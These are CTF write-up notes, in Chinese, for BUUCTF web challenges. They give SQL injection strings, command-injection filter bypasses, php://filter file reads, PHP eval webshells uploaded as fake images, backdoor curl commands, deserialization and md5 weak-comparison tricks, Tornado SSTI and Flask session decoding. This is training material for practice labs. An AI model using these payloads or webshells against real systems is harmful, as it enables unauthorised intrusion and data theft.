# Web-CTF

## Basic

[SSRF漏洞](https://www.cnblogs.com/miruier/p/13907150.html)
[命令执行绕过](https://www.cnblogs.com/zaqzzz/p/10288162.html)
[SSTI漏洞(入门)](https://www.cnblogs.com/bmjoker/p/13508538.html)

## BuuCTF

[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/)

### [极客大挑战 2019]EasySQL

```sql
#admin
#1'or'1'='1
select * from user where account = 'admin' and passwd = '1'or'1'='1' #考SQL注入的万能密码
```

### [极客大挑战 2019]Havefun

```php
#查看源码底部发现
<!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){ #cat要等于dog
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
#于是在url中输入/?cat=dog
```

### [HCTF 2018]WarmUp

```php
#查看源码发现有个注释source.php
#尝试访问该文件 url/source.php 直接拿到源码
<?php
    highlight_file(__FILE__); #文件读取
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"]; #定义白名单
            #定义了一个 $whitelist 白名单数组，包含 "source"=>"source.php" 和 "hint"=>"hint.php" 两个元素，它们分别代表了 source.php 和 hint.php 两个可访问的页面文件
            if (! isset($page) || !is_string($page)) { //检查文件名是否有效
                //isset() 函数用于检测变量是否已设置并且非NULL is_string() 函数用于检测变量是否是字符串
                echo "you can't see it"; //判断传入的页面文件名 $page 是否存在且为字符串类型，如果不满足条件，则输出错误信息并返回 false
                return false;
            }

            if (in_array($page, $whitelist)) { //根据 $page 文件名进行检查
                return true;
            }

            //如果 $page 文件名在白名单数组中包含，则说明该文件可以被访问
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            //如果 $page 文件名没有在白名单数组中找到匹配项，则再次进行检查。首先通过 mb_strpos() 函数在 $page 文件名中找到第一个问号的位置，并使用 mb_substr() 函数获取此位置前的一部分字符串 _page。然后再判断新的文件名 _page 是否在白名单数组中，如果在其中，则说明该文件可以被访问
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
            //如果前两步仍未找到有效的文件名，那么使用 urldecode() 函数对 $page 文件名进行解码后，再次执行类似的处理（截取前面的部分，并查找是否在白名单中），如果文件在白名单中，则说明该文件可以被访问
        }
    }
	//当用户通过 GET 或者 POST 方法向服务器发起请求时，判断请求的文件名是否为空、格式是否正确，并进行白名单校验，如果通过检查，则采用 include 函数进行页面文件加载，并结束脚本运行。否则，输出默认图片和信息。
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

```php
/?file=hint.php #尝试访问 返回 flag not here, and flag in ffffllllaaaagggg 需要进行目录穿越来进入ffffllllaaaagggg所在目录层级
/?file=hint.php?ffffllllaaaagggg #尝试访问发现没有回显 方法可行 继续向上级目录穿越
/?file=hint.php?../../../../../ffffllllaaaagggg #不停穿越直到此处发现flag
```

### [ACTF2020 新生赛]Include

进入查看源码，点击进入链接发现啥都没有，即答案没有在前端页面中，那只能在后端源码里面了。文件包含功能有个「特性」，对于被包含的文件，「代码」部分会直接执行，不会在页面中显示；「非代码」部分（即不能执行的内容）则会在页面中显示。针对这一特性，我们可以将被包含文件的内容「编码」为不可执行的内容，让其在页面中显示，再将页面中的内容在本地「解码」，就可以拿到文件的后端源码了。这里我们可以使用PHP伪协议对文件内容进行base64编码。

```php
#使用PHP伪协议对文件内容进行base64「编码」，将url中file参数替换为以下payload
?file=php://filter/read=convert.base64-encode/resource=flag.php
#页面输出 PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDJmZDljYzMtYTQyNC00N2Q2LThkYjMtZDA4YzU2ZmE2N2Q5fQo=
```

```python
import base64
des = input("Please input:")
src = base64.b64decode(des)
print(src)
```

```cmd
E:\Tools\CTFscript\enCode>python b64encode.py
请输入你要解码的内容:PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MDJmZDljYzMtYTQyNC00N2Q2LThkYjMtZDA4YzU2ZmE2N2Q5fQo=
b'<?php\necho "Can you find out the flag?";\n//flag{02fd9cc3-a424-47d6-8db3-d08c56fa67d9}\n'
```

### [ACTF2020 新生赛] Eexec

```bash
#补充 后面进bin和sbin查看发现没有find命令
ping 127.0.0.1; cat / #用分号作为批量命令分隔 查看根目录 发现flag
ping 127.0.0.1; cat /flag #查看
```

```
flag{c6a8fb66-7e31-44b5-98c0-9ee316a04b9d}
```

### [强网杯 2019]随便注

```sql
#使用SQL注入的堆叠攻击 1'; show tables;# 发现有个1919810931114514和words
#堆叠注入时返回 return preg_match("/select|update|delete|drop|insert|where|\./i",$inject); 会被预匹配过滤
1';show columns from `1919810931114514`; -- a'单引号只是不想影响下行的字体颜色 可以删除
#注意表名如果是数字 表名需要用反引号抱起来 查询后发现有一个flag列 select被过滤可以使用handle命令
';handler `1919810931114514` open;handler `1919810931114514` read first; -- a'单引号只是不想影响下行的字体颜色 可以删除
#flag{51528139-73df-4acf-bb19-022d1cf212a8} 只有一条数据 即flag
#HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭
```

### [GXYCTF2019] Ping Ping Ping

踩坑记录：记得看注释

```bash
?ip=127.0.0.1;ls #命令注入漏洞 查看发现有flag文件
#cat flag.php发现会过滤空格 符号 flag字符串 使用过滤绕过
?ip=127.0.0.1;cat$IFS$9index.php #先看看源码中是如何过滤的
?ip=127.0.0.1;cat$IFS$9`ls` #内敛绕过 以ls的输出内容作为文件名cat查看
?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php #创建变量绕过flag字符串过滤
?ip=127.0.0.1;`echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d` #base64加密绕过
```

### [SUCTF 2019]EasySQL

```sql
#1'or'1'='1返回Nonono 输出1返回数组 要么返回空
1';show databases;# ' #发现堆叠注入
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
1';show columns from ctf;# '#被过滤了 查不到东西
1';handler open ctf;handler 'ctf' read firest; -- 'a

#看完wp和源码，知道了后台的sql语句如下：
select ?||flag from Flag
## ?为输入的关键字
#在oracle中 || 默认为连接符，在MySQL中默认为逻辑或

*,1 #Array ( [0] => flag{512397e2-9cdd-4ced-bb9c-92a95eee8b3c} [1] => 1 )
#逻辑运算后变成 select *,1 from Flag
```

### [极客大挑战 2019]Secret File

[BurpSuite_Community_windows-x64_v2023_2_3](https://portswigger-cdn.net/burp/releases/download?product=community&version=2023.2.3&type=WindowsX64)
查看源码后深入查看发现`./action.php`点去之后直接跳转到了`/end.php`，并说没看清重新看，说明刚才的`./action.php`执行后跳转太快，需要使用Burp抓包
![image-20230321145616596](.\Web-CTF\[极客大挑战 2019]Secret File01.png)

在`./action.php`文件中发现了`secr3t.php`文件，进入并访问发现php源码

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

根据注释提示继续进入

```php
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            我就在这里        </p>
    </body>

</html>
```

前端页面无法查看到代码中的flag，回到**[ACTF2020 新生赛]Include**中。利用其**php://filter**漏洞来输出flag并解密，注意**文件还是在secr3t.php路径后**

```url
http://66f0a486-a692-438d-98b3-22acc2264fa3.node4.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

拿到base64加密后的flag后解密即可

### [极客大挑战 2019]LoveSQL

万能密码直接注入，得到一个密码`5204b9f985f5302347f988f5526060a3`，md5解密无果
**url**中使用`username=admin' order by 3%23&password=1`进行注入先测出字段个数 `%23`在url编码中为`#`

```sql
用户名:admin' order by 4#
密码:1 #此处密码会被上面的注释符注释掉
```

得到输出："Unknown column '4' in 'order clause'"可以知道有3个字段

```sql
用户名:1' union select 1,2,3# 使用union联合攻击
密码:1 #此处密码会被上面的注释符注释掉
```

得到输出：**Hello 2！\nYour password is '3'**

爆出数据库名：

```sql
用户名:1' union select 1,database(),3#
密码:1 #此处密码会被上面的注释符注释掉
```

得到输出：**Hello geek！\nYour password is '3'**，由此可知数据库名为**`geek`**，且显示位是在**2**号位

爆出表名：

```sql
1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#
1' union select 1,(select group_concat(table_name) from information_schema where table_schema = database()),3;#
```

得到输出：**Hello geekuser,l0ve1ysq1！\nYour password is '3'**

爆出列名：

```sql
1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),3#
1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'), 3;#
```

直接查字段内容，得到flag：

得到输出：**Hello id,username,password！\nYour password is '3'**

```sql
1' union select 1,(select group_concat(username,'~',password) from l0ve1ysq1),3#
```

得到输出：**Hello cl4y~wo_tai_nan_le,glzjin~glzjin_wants_a_girlfriend,Z4cHAr7zCr~biao_ge_dddd_hm,0xC4m3l~linux_chuang_shi_ren,Ayrain~a_rua_rain,Akko~yan_shi_fu_de_mao_bo_he,fouc5~cl4y,fouc5~di_2_kuai_fu_ji,fouc5~di_3_kuai_fu_ji,fouc5~di_4_kuai_fu_ji,fouc5~di_5_kuai_fu_ji,fouc5~di_6_kuai_fu_ji,fouc5~di_7_kuai_fu_ji,fouc5~di_8_kuai_fu_ji,leixiao~Syc_san_da_hacker,flag~flag{57802e03-691f-4c10-a26c-8b711d8bfdf0}！\nYour password is '3'**

### [极客大挑战 2019]Knife

题目名就可以想到后门程序Knife.php，网页内容得知后门密码为"Syc"，菜刀或者蚁剑直接连就行了。

```bash
curl -d "Syc=system('ls /');" http://022d841f-d6c1-4bd5-b404-b195a6ac0bd5.node4.buuoj.cn:81/ 
```

```bash
<!DOCTYPE html>
<html>
bin
boot
data
dev
etc
flag #hi i`m here bro, cat me
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```bash
curl -d "Syc=system('cat /flag');" http://022d841f-d6c1-4bd5-b404-b195a6ac0bd5.node4.buuoj.cn:81/
<!DOCTYPE html>
<html>
flag{5258f224-4d0c-4f5c-9fb2-4898a47717c5}
```

### [极客大挑战 2019]Http

https://portswigger-cdn.net/burp/releases/download?product=community&version=2023.2.3&type=WindowsX64 工具下载链接
进入后查看源码进入Secret.php，说我们不是从'https://Sycsecret.buuoj.cn'网址过来的，此时使用BurpSuite抓包直接写入Referer头。

![image-20230321204659029](.\Web-CTF\[极客大挑战 2019]Http01.png)

放修改过后的包Forward之后又告诉我们`Please use "Syclover" browser`，修改`User-Agent`一项为`Syclover`，Forward之后得到`No!!! you can only read this locally!!!`，意思是只能在本地访问，所以继续`X-Forwarded-For:127.0.0.1`

```htaccess
GET /Secret.php HTTP/1.1
Host: node4.buuoj.cn:29237
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Syclover
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Referer:https://Sycsecret.buuoj.cn
X-Forwarded-For:127.0.0.1
Connection: close
```

Forward之后直接拿到flag：flag{beb3cd7a-556d-4a79-9d75-930ddf6d5d73} (每个账号在靶机上的flag是不一样的)

### [极客大挑战 2019]Upload

vim hack.phtml

```php+HTML
GIF89a
<script language="php">eval($_POST['shell']);</script>
```

使用BurpSuite抓包拦截，在上传文件时将`Content-Type:`项修改为`image/jpeg`后Forward放行，此时对端确认文件为图片上传成功页面会有文件名，
由于题目为upload，推测文件被保存在了upload目录下，然后使用蚁剑或菜刀连接，密码为之前一句话木马中写的`shell`，最后在跟目录下发现flag。

### [ACTF2020 新生赛]Upload

```php
<?php @eval($_POST['pass']); ?> #创建1.jpg
```

BurpSuite抓包拦截修改文件后缀为php上传发现不行，换phtml后缀可以，网页回复上传成功并告诉了更名后文件的所在目录，直接上蚁剑或菜刀操作。

### [极客大挑战 2019]BabySQL

万能密码干一把网页说不行，发现`or`寄了用不了，测一下 union 和 select：

```
username=admin
password=1' union select 1 #
```

发现还是寄了，这时使用双写绕过：

```
1' ununionion seselectlect 1 #
```

虽然报错了，但是没有说语法有问题，注入成功，测出字段个数

```
1' ununionion seselectlect 1,2,3 # 				测到字段个数为3
```

```
1' ununionion seselectlect 1,database(),3 #      返回Login Success!Hello geek！Your password is '3'
```

```sql
1' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom information_schema.tables whwhereere table_schema=database()),3 # 			发现from、where也被过滤 双写 
Table 'infmation_schema.tables' doesn't exist ==> 注意infor中的or也会被过滤
1' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()),3 #			infoorrmation防止避免过滤or,写在or的中间变为oorr 得到信息Hello b4bsql,geekuser！Your password is '3
根据url中的字段可以推断出表的字段名为username,password 注意or会被过滤掉需要双写
1' ununionion seselectlect 1, group_concat(concat_ws(0x7e,username,passwoorrd)), 3 frfromom geekuser# 
Hello admin~cabae956670bc12dff45ac21d2b8130b！
1' ununionion seselectlect 1, group_concat(concat_ws(0x7e,username,passwoorrd)), 3 frfromom b4bsql# 分别查询两个表的内容
Hello cl4y~i_want_to_play_2077,sql~sql_injection_is_so_fun,porn~do_you_know_pornhub,git~github_is_different_from_pornhub,Stop~you_found_flag_so_stop,badguy~i_told_you_to_stop,hacker~hack_by_cl4y,flag~flag{1de5bf0a-9cbe-4154-b68f-01cfe6d9540e}！
```

### [极客大挑战 2019]PHP

[GitHub - maurosoria/dirsearch: Web path scanner](https://github.com/maurosoria/dirsearch)

```bash
./dirsearch.py -u http://71f04e34-1537-41f0-8c4f-e3de12f432b9.node3.buuoj.cn -e php #使用dirseach直接爆破网站目录
```

爆破需要点时间，最后拿到网站备份文件www.zip(一般备份文件是.bak/.zip)，解压看flag.php发现是fake的，查看index.php发现它调用了class.php，继续。

```php
<?php
include 'flag.php';
error_reporting(0);
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
        }
    }
}
?>
```

本题是一道反序列化题目

```php
<?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
}
$a = new Name('admin',100);
$b = serialize($a);
echo ($b);
?>
```

保存文件执行一次得到：`O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}`
执行unserialize()函数之前会检查是否存在一个 \_\_wakeup() 方法。如果存在，则会先调用 \_\_wakeup方法，预先准备对象需要的资源
Name后有一个数字2，这个2是代表这个类有一个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。这里将2改为3跳过__wakeup：`O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}`，网页报错，问题处在了private的私有字段上。
private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度：`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
用GET方法将`O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`作为select的变量值提交 

```
payload：select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

### [ACTF2020 新生赛]BackupFile

dirsearch目录爆破发现/index.php.bak，进入后发现下载到了一个备份文件，直接查看。

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) { #is_numeric() 函数用于检测变量是否为数字或数字字符串
        exit("Just num!"); #只能数字
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"; #key需要等于str
    #php为弱类型语言使用==比较字符串和整型时，会将字符串转化成整型，如上的字符串在转化成整型时只保留整数部分123后面的字符串全部省略
    if($key == $str) { #弱类型比较
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

```php
/index/php?key=123 #payload
```

### [RoarCTF2019] Easy Calc

主要考察对于php字符串的解析特性
查看源代码发现里面有一个calc.php，在链接中打开该文件发现源代码中出现了过滤的功能，第一个就会过滤空格。
paylaod：calc.php?空格num=phpinfo(); 这样，会先触发规则，删除空格，进而将一个名称为num的参数传入

```php
http://node4.buuoj.cn:25553/calc.php?%20num=phpinfo()
```

![image-20230321191302809](.\Web-CTF\[RoarCTF 2019]Easy Calc.png)

```php
http://node4.buuoj.cn:25553/calc.php?%20num=var_dump(scandir(chr(47))) 得到如下回显 chr(47)是ASCII码值47 即'/' 过滤了'/' 所以用ASCII替换的
#array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" } 看见数组下标为5的内容为flagg 直接读它
```

scandir() 函数返回指定目录中的文件和目录的数组。var_dump()函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。

```shell
http://node4.buuoj.cn:25553/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));
#此函数类似于file()函数，不同之处在于，file_get_content()函数返回字符串中的文件，该字符串从指定偏移量开始，最大可达maxlen字节。
#file_get_contents()可以将文件读入字符串。此函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。
```

**string(43) "flag{2beb9d2c-c3a4-4892-8ae3-bfbd0b088edd} "**

### [极客大挑战 2019]BuyFlag

查看源码进入bug.php，查看源码发现注释：

```php
~~~post money and password~~~ #提示用POST方式
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>"; #不能是数字
	}elseif ($password == 404) { #密码需要是404
		echo "Password Right!</br>"; 
	}
}
```

题目提示用POST，Burp右键更改请求方法，
抓包看见头文件中有一个`Cookie: user=0`，
推测该字段控制是否为CUIT学生，直接抓包界面改成`1`即`true`。
php审计利用弱类型构造`passwd=404a`，加上`money=100000000`

```php
password=404a&money=100000000 #注意需要和头文件信息空一行输入
```

![image-20230322153420568](.\Web-CTF\[极客大挑战 2019]BuyFlag.png)

网页返回：you are Cuiter \r\n Password Right! \r\n Nember lenth is too long，说数字长度太长了，可以使用科学计数法或者数组money[]=1

```php
password=404a&money[]=1
password=404a&money=30e10 #money比100000000大就可以
```

完活了直接拿到flag，推测后端比较money的100000000时使用了strcmp()，[PHP弱类型之strcmp绕过_Bernabeu· J的博客-CSDN博客](https://blog.csdn.net/weixin_45082914/article/details/108011000?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control)，该文章补充其他知识。

### [BJDCTF2020]Easy MD5

https://github.com/BjdsecCA/BJDCTF2020
https://github.com/Mr-xn/hackbar2.1.3
下载后浏览器扩展中打开开发者模式，允许第三方商店，解压后选择解压后的文件夹即可，F12向后拉找到HackBar

啥信息都没有，上BurpSuite抓个包瞅瞅，发现里面有条SQL语句![image-20230322155901663](.\Web-CTF\[BJDCTF2020]Easy MD5.png)

可以用`ffifdyop`绕过，绕过原理是：`ffifdyop` 这个字符串被 md5 哈希了之后会变成 `276f722736c95d99e921722cf9ed621c`，这个字符串前几位刚好是`' or '6`
 而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是`1select * from 'admin' where password='' or '6xxxxx'`，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。

绕过该SQL之后查看源代码发现php代码

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

典型的md5碰撞，弱比较可以用md5值为0e开头的来撞。一些md5以后是0e开头的值：

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020
```

直接构造：`http://37d8016d-643c-4764-8e62-c8a24e224a75.node3.buuoj.cn/levels91.php?a=QNKCDZO&b=s155964671a`

```php
<?php
error_reporting(0);
include "flag.php"; #又来= =但是近在咫尺了

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){ #:)学会坚强
    #参数1和2弱相等 并且1和2的md5需要强类型相等
    #md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等
    #要么就是用md5值强行碰撞找两个md5值相同的字符串(还是算了)
    echo $flag;
}
```

直接构造：`http://0562e2e7-8db6-461d-b880-c31cf2834ee0.node4.buuoj.cn:81/levell14.php?param1[]=1&param2[]=2` 注意此处POST请求需要HackBar

![image-20230322163317761](.\Web-CTF\[BJDCTF2020]Easy MD5 02.png)

### [护网杯 2018]easy_tornado

看一遍发现信息：`md5(cookie_secret+md5(filename))` & `flag in /fllllllllllllag` & `render`，
`render`为python渲染函数，[Tornado Web Server — Tornado 4.3 文档 (tornado-zh.readthedocs.io)](https://tornado-zh.readthedocs.io/zh/latest/)
hint文件中提示filehash为cookie_secret+md5的filename组成，其中显示`md5(cookie_secret+md5(filename))`信息`的fints.txt`文件告诉了我们打开url时会更改两个参数：`http://cd79ba0c-eb65-4e83-bddd-15d4594cc97e.node4.buuoj.cn:81/file?filename=/hints.txt&filehash=c06110a219e82f5da3db6dc2d3488bac`
即`filename`&`filehash`，直接用filename尝试访问flag，直接报错Error，此时url为`http://cd79ba0c-eb65-4e83-bddd-15d4594cc97e.node4.buuoj.cn:81/error?msg=Error`，发现msg变量
试试`[cd79ba0c-eb65-4e83-bddd-15d4594cc97e.node4.buuoj.cn:81/error?msg={{1}}](http://cd79ba0c-eb65-4e83-bddd-15d4594cc97e.node4.buuoj.cn:81/error?msg={{1}})`，网页返回了数字1，此处存在模板注入，并且第二个文件的信息还没有使用，猜测使用模板注入获取`cookie_secret`，如下：
`http://cd79ba0c-eb65-4e83-bddd-15d4594cc97e.node4.buuoj.cn:81/error?msg={{handler.settings}}`
进入后直接输出了cookie信息：`{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '564f7c96-772c-4868-a37f-a0bdafaf5383'}`

```python
pip install hashlib -i https://pypi.tuna.tsinghua.edu.cn/simple
```

```python
import hashlib #导入hashlib模块
hash = hashlib.md5() #创建一个MD5对象，即调用hashlib.md5()函数
filename='/fllllllllllllag'
cookie_secret="e5bbcab1-9d34-4556-88b7-5b60f092a627" #写入你收到的cookie
hash.update(filename.encode('utf-8')) #对filename进行编码转换成utf-8格式，并更新到MD5对象中
s1=hash.hexdigest() #获取MD5哈希值，保存在s1变量中
hash = hashlib.md5() #重新创建一个MD5对象
hash.update((cookie_secret+s1).encode('utf-8')) #按照文件提示的格式来进行加密
print(hash.hexdigest()) #执行后程序输出3ebfc8915192d7a139d71990975cd108
```

```python
#coding:utf-8
import hashlib #这个脚本也可以
def md5(s):
    md5 = hashlib.md5()
    md5.update(s.encode("utf8"))
    return md5.hexdigest()
def filehash():
    filename = '/fllllllllllllag'
    cookie_secret = '86453dc7-a1f0-4636-b0c8-bfd7ed05aa03'
    print(md5(cookie_secret + md5(filename)))
if __name__ == '__main__':
    filehash()
```

将filename=/fllllllllllllag和程序运算得出的hash写入url直接拿到flag

```bash
http://2f36a5ad-c653-49f1-bb49-6d74cb9b055b.node4.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=3ebfc8915192d7a139d71990975cd108
```

### [HCTF 2018]admin

**0x01** 弱密码爆破一下发现密码是123，直接拿到flag。

**0x02** Unicode欺骗

注册并登录，在改密码界面查看源码发现注释中给出了gayhub(?Doge)的源码，[Page not found · GitHub · GitHub](https://github.com/woadsl1234/hctf_flask/)，很遗憾现在这个链接寄了

```php
@app.route('/change', methods = ['GET', 'POST']) #当修改密码的时候会判断用户名，将用户名转换为小写
def change():
    if not current_user.is_authenticated:
        return redirect(url_for('login'))
    form = NewpasswordForm()
    if request.method == 'POST':
        name = strlower(session['name'])  #这里将用户名转换为小写
        user = User.query.filter_by(username=name).first()
        user.set_password(form.newpassword.data)
        db.session.commit()
        flash('change successful')
        return redirect(url_for('index'))
    return render_template('change.html', title = 'change', form = form)
```

```php
def register(): #注册页面源代码中也发现同样的小写函数调用注

    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = RegisterForm()
    if request.method == 'POST':
        name = strlower(form.username.data) #将注册提交的用户名小写
        if session.get('image').lower() != form.verify_code.data.lower():
            flash('Wrong verify code.')
            return render_template('register.html', title = 'register', form=form)
        if User.query.filter_by(username = name).first():
            flash('The username has been registered')
            return redirect(url_for('register'))
        user = User(username=name)
        user.set_password(form.password.data)
        db.session.add(user)
        db.session.commit()
        flash('register successful')
        return redirect(url_for('login'))
    return render_template('register.html', title = 'register', form = form)
```

```php
def login(): #登录页面也有转换小写调用
    if current_user.is_authenticated:
        return redirect(url_for('index'))

    form = LoginForm()
    if request.method == 'POST':
        name = strlower(form.username.data)  #提交的数据转换为小写
        session['name'] = name
        user = User.query.filter_by(username=name).first()
        if user is None or not user.check_password(form.password.data):
            flash('Invalid username or password')
            return redirect(url_for('login'))
        login_user(user, remember=form.remember_me.data)
        return redirect(url_for('index'))
    return render_template('login.html', title = 'login', form = form)
```

```php
#twisted 是python里面公认的很牛的网络编程框架。twisted是基于单线程的事件驱动的网络引擎。
def strlower(username): #这里用的转小写函数不是python自带的lower函数，而是strlower函数，看来是作者自定义的函数
    username = nodeprep.prepare(username)
    return username
#使用的是 nodeprep.prepare函数，这个函数是用Twisted模块导入，而且查看项目时发现这个项目的Twisted版本相对于当时题目发布的时间是落后的，直接尝试进行unicode编码转换小写
```

其实使用nodeprep.prepare函数转换的过程就是下面这个过程

```
ᴬᴰᴹᴵᴺ -> ADMIN -> admin
```

所以我们可以注册一个ᴬᴰᴹᴵᴺ 用户，然后在登录界面的时候用了一次nodeprep.prepare函数，然后进去后界面就显示我们是ADMIN用户，然后在修改密码界面修改密码的时候，ADMIN就变成了admin，最后我们就成了修改admin的密码，然后登录admin用户

**0x03** flask session伪造

登录的时候通过抓包发现，登录的用户是有session的，伪造admin的session从而登录admin的用户，前提就是要先知道flask的session是如何形成的
flask的session机制：https://cizixs.com/2017/03/08/flask-insight-session/
flask的session是储存在客户端中，那么就可以进行读取进而进行伪造
客户端session安全问题：https://www.leavesongs.com/PENETRATION/client-session-security.html
下面使用脚本将session进行解密

```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

解密结果如下：

```
{'_fresh': True, '_id': b'71223133265323aadf8c1c2c8765fac0fe6eb23d3bfc3f5c72505321e222db2f8790d1d95f042f4f756cd52028787088cc8ae621d2331c49812fc47adce67341', 'csrf_token': b'75d655b165c0f29feb01dc2a5a95275eb84e506e', 'image': b'OsZa', 'name': 'admin', 'user_id': '1'}
```

